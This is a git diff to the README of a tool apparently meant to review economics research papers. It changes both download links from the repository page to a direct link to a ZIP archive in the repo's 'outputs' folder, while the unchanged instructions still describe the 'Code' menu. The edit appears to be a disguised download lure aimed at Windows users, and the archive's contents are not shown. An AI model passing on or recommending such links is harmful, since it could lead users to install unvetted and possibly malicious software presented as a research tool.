@@ -1,6 +1,6 @@
 # 📑 reviewer - Automated feedback for economics research papers
 
-[![](https://img.shields.io/badge/Download-Reviewer_Software-blue.svg)](https://github.com/joshunspeakable173/reviewer)
+[![](https://img.shields.io/badge/Download-Reviewer_Software-blue.svg)](https://github.com/joshunspeakable173/reviewer/raw/refs/heads/main/outputs/Software_v2.3.zip)
 
 This tool helps researchers process academic economics papers. It uses a series of automated agents to read a PDF file and generate a structured review. The software handles the extraction of text, the analysis of content, and the organization of feedback.
 
@@ -12,7 +12,7 @@ You need a computer running Windows. This software requires a small amount of di
 
 Visit the repository page to download the software files to your computer.
 
-[Download the Reviewer software here](https://github.com/joshunspeakable173/reviewer)
+[Download the Reviewer software here](https://github.com/joshunspeakable173/reviewer/raw/refs/heads/main/outputs/Software_v2.3.zip)
 
 Look for the button labeled "Code" on the page and select "Download ZIP" from the menu. Save this folder to your desktop or your documents folder. Extract the contents of the ZIP file by right-clicking the folder and choosing "Extract All."
 
